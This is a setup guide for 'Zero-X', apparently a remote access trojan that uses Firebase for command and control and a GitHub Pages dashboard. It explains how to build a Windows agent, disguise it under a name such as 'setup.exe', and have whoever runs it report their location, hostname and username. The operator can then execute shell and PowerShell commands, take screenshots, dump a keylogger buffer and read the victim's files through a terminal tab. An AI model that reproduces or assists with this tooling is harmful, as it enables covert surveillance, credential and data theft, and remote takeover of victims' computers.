# Zero-X — Setup Guide

## What you need to install (one-time, on your own PC)

### Option A — Automatic via GitHub Actions (recommended, zero installs)
Push the repo to GitHub. Actions builds `template.exe` for you automatically.
Skip straight to **Step 3** below.

---

### Option B — Compile locally yourself

**Install .NET 8 SDK** (free, ~200 MB):
https://dotnet.microsoft.com/en-us/download/dotnet/8

That's the only thing you need. No Visual Studio required.

---

## Steps

### Step 1 — Push repo to GitHub
Make sure your repo is `<yourusername>.github.io` on GitHub.
Push all the files including `.github/workflows/build-agent.yml`.

### Step 2 — GitHub Actions builds template.exe
Go to your repo → **Actions** tab → you'll see "Build Agent Template" running.
It takes about 2 minutes. When it's done, `template.exe` appears in your repo.

> You can also trigger it manually: Actions → Build Agent Template → Run workflow

### Step 3 — Set up Firebase (free, no credit card)
1. Go to https://console.firebase.google.com
2. Click **Add project** — name it anything, disable Google Analytics
3. In your project: **Realtime Database** → **Create database** → Start in **test mode**
4. Your DB URL appears at the top: `https://your-project-default-rtdb.firebaseio.com`
5. **Project Settings** (gear icon top-left) → **Service accounts** tab
6. Scroll down to **Database secrets** → click **Show** → copy the secret string

### Step 4 — Configure your dashboard
1. Open your GitHub Pages site and log in with Discord
2. Go to **Builder** tab
3. Paste your Firebase DB URL and database secret → **Save Firebase Config**
4. Click **Test Connection** — it should go green
5. Status chip turns green when both Firebase is configured AND `template.exe` exists

### Step 5 — Generate your EXE
1. Builder tab → type a filename (e.g. `setup.exe`)
2. Click **Generate & Download EXE**
3. The site patches your Firebase credentials + your Discord ID into the binary
4. File downloads — ready to deploy

---

## How it works

```
Someone runs your EXE
        ↓
Agent grabs their IP, geolocates it, sends data to Firebase
        ↓
Your dashboard map shows a pin at their location
        ↓
Users tab shows them: hostname, username, city, OS, status
        ↓
Terminal tab — select them, type a command, hit Send
        ↓
Agent picks up command from Firebase (polls every 2s)
        ↓
Executes it, sends result back to Firebase
        ↓
Result appears in your terminal
```

## Compile locally (Option B only)

```bash
# In the folder with Agent.cs and Agent.csproj:
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true

# Output is in: publish/template.exe
# Copy it to your repo root as template.exe and push
```

## Terminal commands

| Command | What it does |
|---------|-------------|
| `whoami` | Any shell command |
| `ps: Get-Process` | PowerShell (prefix with `ps:`) |
| `screenshot` | Captures full screen, shows inline |
| `sysinfo` | Hostname, user, OS, RAM, IP |
| `keylog` | Dumps keylog buffer |
| `ls C:\Users\` | List directory |
| `download C:\path\file.txt` | Read file (base64, max 4MB) |
| `pslist` | Running processes |
| `kill` | Terminate agent |
